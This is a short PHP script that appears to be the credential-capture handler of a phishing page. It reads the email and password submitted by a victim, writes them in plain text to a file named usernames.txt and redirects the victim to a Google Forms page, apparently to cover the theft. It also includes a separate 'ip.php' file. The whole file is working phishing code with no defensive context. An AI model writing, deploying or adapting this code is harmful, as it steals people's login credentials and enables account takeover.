<?php
include 'ip.php';
file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['email'] . " [PASS]: " . $_POST['pass'] . "\n", FILE_APPEND);
header ('Location: https://docs.google.com/forms/d/e/1FAIpQLSdl11XXlyoNkvuM9Dyv421E4Jgm5ATNcPe3e-bPhteuXAP68g/viewform');
exit();
